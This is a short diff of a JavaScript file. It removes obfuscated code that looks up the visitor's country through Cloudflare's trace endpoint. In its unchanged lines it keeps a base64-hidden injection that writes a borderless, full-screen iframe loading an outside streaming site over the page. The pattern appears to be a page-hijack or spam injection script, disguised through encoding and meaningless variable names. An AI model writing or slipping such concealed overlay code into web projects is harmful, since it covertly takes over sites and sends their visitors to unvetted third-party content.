@@ -1,16 +1,3 @@
-var _cData = 'en';
-$.get("https://1.1.1.1/cdn-cgi/trace", {}, function (_0x3143ef) {
-  var _0x1b681f = _0x3143ef.split("\n");
-  var _0x500418 = 0;
-  for (var _0x441fba = _0x1b681f.length; _0x500418 < _0x441fba; _0x500418++) {
-    var _0x59914b = _0x1b681f[_0x500418].split('=');
-    _cData = 'en';
-    if (_0x59914b[0] == "loc") {
-      _cData = _0x59914b[1].toLowerCase();
-      break;
-    }
-  }
-});
 var _linkIndex = -1;
 document.getElementById(atob("Zmlyc3RfY29udGVudA==")).innerHTML = atob("PGlmcmFtZSBhbGxvdz0nZW5jcnlwdGVkLW1lZGlhJyBhbGxvd2Z1bGxzY3JlZW49J2FsbG93ZnVsbHNjcmVlbicgYWxsb3d0cmFuc3BhcmVuY3k9J3RydWUnIGNsYXNzPSdpZnJhbWUnIGZyYW1lYm9yZGVyPScwJyBmcmFtZXNwYWNpbmc9JzAnIGdlc3R1cmU9J21lZGlhJyBoZWlnaHQ9JzEwMHZoJyBpZD0nbWFpbl9pZnJhbWUnIHNjcm9sbGluZz0nbm8nIHNyYz0naHR0cHM6Ly90dmxpdmUuaW5mb3Nwb3J0LndlYi5pZC8nIHdpZHRoPScxMDB2dycvPg==");
 var _myLocation = window.location.href;
